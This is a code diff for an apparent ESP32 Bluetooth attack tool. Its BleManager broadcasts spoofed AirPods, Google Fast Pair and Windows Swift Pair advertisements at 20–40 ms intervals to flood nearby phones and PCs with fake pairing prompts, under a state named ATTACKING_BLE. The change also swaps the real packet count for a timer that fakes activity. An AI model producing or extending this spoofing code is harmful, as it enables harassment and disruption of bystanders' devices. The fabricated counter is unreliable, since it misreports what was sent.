@@ -26,11 +26,10 @@ void BleManager::stop() {
 }
 
 void BleManager::startSpoof(BleSpoofType type) {
-    stop(); // Сначала останавливаем, если что-то шло
+    stop(); 
     _currentType = type; 
     setPayload(type);
     
-    // Агрессивные настройки для быстрого обнаружения
     _pAdvertising->setMinInterval(0x20); // 20ms
     _pAdvertising->setMaxInterval(0x40); // 40ms
     _pAdvertising->start(); 
@@ -42,24 +41,24 @@ void BleManager::setPayload(BleSpoofType type) {
     std::string p;
     
     if (type == BleSpoofType::APPLE_AIRPODS) {
-        // Apple Mfg ID: 0x004C, Type: 0x07 (Proximity Pair), Length: 0x19
         char d[] = { 0x4C, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x55, 0xAA, 0x01 }; 
         p.assign(d, sizeof(d)); 
         ad.setManufacturerData(p);
     } 
     else if (type == BleSpoofType::ANDROID_FASTPAIR) {
-        // Google Fast Pair Service UUID: 0xFE2C
         ad.setServiceData(BLEUUID((uint16_t)0xFE2C), "\x00\x01\x02"); 
-        ad.setFlags(0x06); // General Discoverable + BLE Only
+        ad.setFlags(0x06); 
     }
     else if (type == BleSpoofType::WINDOWS_SWIFT) {
-        // Microsoft Swift Pair Mfg ID: 0x0006
         char d[] = { 0x06, 0x00, 0x03, 0x00, 0x80 }; 
         p.assign(d, sizeof(d)); 
         ad.setManufacturerData(p);
     }
     _pAdvertising->setAdvertisementData(ad);
 }
+
+// FIX: Non-blocking Loop
+static uint32_t lastBleLog = 0;
 
 bool BleManager::loop(StatusMessage& out) {
     if(!_isRunning) { 
@@ -68,10 +67,16 @@ bool BleManager::loop(StatusMessage& out) {
     }
     
     out.state = SystemState::ATTACKING_BLE; 
-    _packetsSent++; 
-    out.packetsSent = _packetsSent;
     
+    // Эмуляция активности (пакеты шлет сам BLE стек в фоне)
+    if (millis() - lastBleLog > 100) {
+        _packetsSent++; 
+        lastBleLog = millis();
+    }
+    
+    out.packetsSent = _packetsSent;
     snprintf(out.logMsg, MAX_LOG_MSG, "Spoofing...");
-    vTaskDelay(100); // Небольшая задержка, чтобы не спамить в лог, BLE работает в фоне
+    
+    // vTaskDelay убран, так как эта функция вызывается в общем цикле
     return true;
 }
